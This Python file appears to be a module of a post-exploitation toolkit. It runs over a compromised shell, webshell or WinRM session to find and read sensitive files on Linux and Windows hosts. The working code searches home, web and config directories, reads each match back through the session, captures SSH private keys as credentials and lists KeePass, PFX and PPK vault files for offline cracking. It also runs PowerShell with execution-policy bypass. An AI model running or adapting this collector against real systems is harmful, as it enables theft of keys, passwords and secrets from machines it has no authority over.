"""Known-filename collector: driven by the data list, not code. Locate
each known sensitive file, emit it, scan its contents. Adding a runtime = adding
a filename to reap/data/known_filenames.txt.

OS-aware: a Linux/unknown session uses find|cat; a Windows session uses
Get-ChildItem|Get-Content. Known-binary vault/key files are reported path-only
(pull and crack offline) rather than dumped through the channel.
"""
from __future__ import annotations

import shlex
from pathlib import Path

from ...models import Credential, Finding
from ...patterns import scan_line
from ..base import Module, register

_SSH_KEY_NAMES = ("id_rsa", "id_ed25519", "id_ecdsa", "id_dsa")
_BINARY_EXTS = (".kdbx", ".kdb", ".pfx", ".p12", ".ppk", ".rdp", ".psafe3")


def _load_names() -> list[str]:
    try:
        from importlib.resources import files
        raw = files("reap.data").joinpath("known_filenames.txt").read_text(encoding="utf-8")
    except Exception:  # pragma: no cover
        raw = (Path(__file__).resolve().parents[2] / "data" / "known_filenames.txt").read_text()
    return [ln.strip() for ln in raw.splitlines() if ln.strip() and not ln.startswith("#")]


@register
class KnownFilenameCollector(Module):
    name = "known_filenames"

    def triggers(self, ctx) -> bool:
        return ctx.os in ("linux", "unknown", "windows")

    def collect(self, session):
        names = _load_names()
        probe = session.exec("uname -s", timeout=10)
        if probe.ok and "linux" in probe.out.lower():
            return self._collect_linux(session, names)
        # No POSIX uname → treat as Windows (works over webshell/winrm too).
        return self._collect_windows(session, names)

    # -- linux -----------------------------------------------------------------
    def _collect_linux(self, session, names) -> list[Finding]:
        expr = " -o ".join(f"-name {shlex.quote(n)}" for n in names)
        roots = "/home /root /var/www /srv /opt /app /etc"
        prune = ("-path '*/node_modules/*' -o -path '*/site-packages/*' "
                 "-o -path '*/vendor/*'")
        find_cmd = (f"find {roots} \\( {prune} \\) -prune -o -type f "
                    f"\\( {expr} \\) -size -512k -print 2>/dev/null | head -n 200")
        git_cmd = ("find /home /var/www /srv /opt /app -path '*/.git/config' "
                   "2>/dev/null | head -n 20")
        paths = session.exec(find_cmd, timeout=60).stdout.splitlines()
        paths += session.exec(git_cmd, timeout=30).stdout.splitlines()

        findings: list[Finding] = []
        for path in paths:
            path = path.strip()
            if not path:
                continue
            base = path.rsplit("/", 1)[-1]
            if path.lower().endswith(_BINARY_EXTS):
                findings.append(Finding(type="info", title=f"Vault/key file: {path}",
                                        severity="high", detail="pull & crack offline",
                                        source_module=self.name))
                continue
            content = session.exec(f"cat {shlex.quote(path)} 2>/dev/null", timeout=15).stdout
            findings.append(Finding(type="info", title=f"Sensitive file: {path}",
                                    severity="low", detail=base, source_module=self.name))
            if base in _SSH_KEY_NAMES and "PRIVATE KEY" in content:
                cred = Credential(kind="ssh_key", secret=content, source=path,
                                  metadata={"path": path})
                findings.append(Finding(type="credential", title=f"SSH private key: {path}",
                                        severity="high", detail="private key",
                                        credential=cred, source_module=self.name))
                continue
            for f in scan_line(content, path):
                f.source_module = self.name
                findings.append(f)
        return findings

    # -- windows ---------------------------------------------------------------
    def _collect_windows(self, session, names) -> list[Finding]:
        inc = ",".join("'" + n.replace("'", "''") + "'" for n in names)
        roots = r"'C:\Users','C:\inetpub','C:\ProgramData','C:\Windows\Panther'"
        ps = ('powershell -nop -ep bypass -c "Get-ChildItem -Path ' + roots +
              ' -Recurse -Force -Include ' + inc +
              ' -EA 0 | Select-Object -First 200 | %{ $_.FullName }"')
        paths = [p.strip() for p in session.exec(ps, timeout=90).stdout.splitlines()
                 if p.strip()]

        findings: list[Finding] = []
        for path in paths:
            base = path.rsplit("\\", 1)[-1]
            if path.lower().endswith(_BINARY_EXTS):
                findings.append(Finding(type="info", title=f"Vault/key file: {path}",
                                        severity="high",
                                        detail="pull & crack offline (keepass2john / pfx2john)",
                                        source_module=self.name))
                continue
            content = session.exec(
                'powershell -nop -c "Get-Content -Raw ' + f"'{path}'" + ' -EA 0"',
                timeout=20).stdout
            findings.append(Finding(type="info", title=f"Sensitive file: {path}",
                                    severity="low", detail=base, source_module=self.name))
            for f in scan_line(content, path):
                f.source_module = self.name
                findings.append(f)
        return findings
